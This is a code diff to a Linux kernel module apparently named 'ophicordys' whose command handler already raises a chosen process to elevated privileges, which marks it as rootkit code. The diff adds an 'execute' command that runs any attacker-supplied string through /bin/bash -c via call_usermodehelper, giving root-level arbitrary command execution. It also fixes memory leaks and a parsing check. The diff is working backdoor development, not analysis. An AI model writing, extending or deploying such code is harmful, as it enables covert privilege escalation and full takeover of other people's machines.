@@ -34,6 +34,7 @@ MODULE_VERSION("1.0");
 // Function Prototypes
 int ophicordys_strcmp(char*, char*, size_t);
 int handle_command(void);
+int execute_shell_command(char*);
 int elevate_task(int);
 int ophicordys_open(struct inode *, struct file *);
 ssize_t ophicordys_read(struct file *, char __user *, size_t, loff_t *);
@@ -105,7 +106,7 @@ int handle_command() {
             return 1;
         }
 
-        if (*current_char == ' ') {
+        if (*current_char == ' ' && read_operator) {
             read_operator = 0;
             current_char++;
             continue;
@@ -138,10 +139,20 @@ int handle_command() {
             printk(KERN_ALERT "%s: Failed to convert opcode to unsigned long.\n", THIS_MODULE->name);
             #endif
 
+            kfree(operator);
+            kfree(opcode);
             return 1;
         }
 
         elevate_task((int)(pid & 0x7fffffff));
+
+    }
+    else if (ophicordys_strcmp(operator, "execute", OPHICORDYS_OPERATOR_SIZE)) {
+        #ifdef DEBUG
+        printk(KERN_INFO "%s: Executing shell command: %s\n", THIS_MODULE->name, opcode);
+        #endif
+
+        execute_shell_command(opcode);
 
     }
     #ifdef DEBUG
@@ -152,6 +163,29 @@ int handle_command() {
 
     kfree(operator);
     kfree(opcode);
+    return 0;
+}
+
+int execute_shell_command(char* command) {
+    if (!command) {
+        #ifdef DEBUG
+        printk(KERN_INFO "%s: Attempted to execute empty command. Aborting.\n", THIS_MODULE->name);
+        #endif
+        return 1;
+    }
+
+    char *argv[] = { "/bin/bash", "-c", command, NULL };
+    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)) {
+        #ifdef DEBUG
+        printk(KERN_INFO "%s: Failed to execute command Aborting.\n", THIS_MODULE->name);
+        #endif
+        return 1;
+    }
+
+    #ifdef DEBUG
+    printk(KERN_INFO "%s: Command executed.\n", THIS_MODULE->name);
+    #endif
     return 0;
 }
 
